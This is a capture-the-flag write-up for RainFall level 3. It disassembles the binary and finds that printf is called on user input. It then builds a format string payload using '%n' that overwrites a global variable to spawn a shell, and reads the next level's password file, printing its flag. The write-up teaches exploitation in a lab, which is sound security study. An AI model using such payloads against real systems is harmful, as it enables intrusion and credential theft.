## LEVEL 3

As several times previously i gonna disassemble the code to understand how it works.

```shell
level3@RainFall:~$ gdb -q level3
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
```

GDB teachs us many things.

```shell
0x080484d5 <+49>:	call   0x8048390 <printf@plt>
0x080484da <+54>:	mov    0x804988c,%eax
0x080484df <+59>:	cmp    $0x40,%eax
```
Now we know that after `printf()` calls the program move `0x804988c` in `eax` to compare it with value `0x40` if the compare is correct it can launch a new shell. But we know that `gets()` isn't used instead the program use `fgets()` which is secured. Let's see how printf is called with `ltrace`.

```shell
level3@RainFall:~$ ltrace ./level3
__libc_start_main(0x804851a, 1, 0xbffff7a4, 0x8048530, 0x80485a0 <unfinished ...>
fgets(AAAAA
"AAAAA\n", 512, 0xb7fd1ac0)          = 0xbffff4f0
printf("AAAAA\n"AAAAA
)                          = 6
+++ exited (status 0) +++
```

`ltrace` shows us that `printf()` is called with the `fgets()` buffer so we can easily understand that `printf()` is called as below.

```c
printf(buffer);
```

That's means that we can use a **Format String Attack**.

### Format String Attack

A format string attack is a `printf()` vulnerability which consists use printf's flags in the buffer, and `printf()` won't know what to read, so it will read random places on stack.

**Example :**
```shell
level3@RainFall:~$ python -c 'print "AAAA %p %p %p %p %p %p"' | ./level3
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
```

As we can see, `printf()` prints random adresses in the stack except for one address, the fourth. The fourth adress is the value given in the begin of our string. Interesting, that's means that if we write a correct address instead of `AAAA` and change `%p` with `%d` we can print a value of a precise address in the stack. Let's try to print the address found few lines above.

```shell
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%d %d %d %d %d %d"' | ./level3
�512 -1208149312 -1208010800 134518924 622879781 1680154724
```

OK, that's looks good for us. We know that `printf()`'s flag %n can write a precise address with the len of our string. So if we write our address and then 60 characters before our flag we can change the value pointed the address to `0x40`.

### Payload

`python -c 'print "\x8c\x98\x04\x08" + "\x90"*60 + "%4$n"' > /tmp/payload`

Now we have our payload we just have to inject it into the program.

```shell
level3@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level4/.pass") | ./level3
�������������������������������������������������������������
Wait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
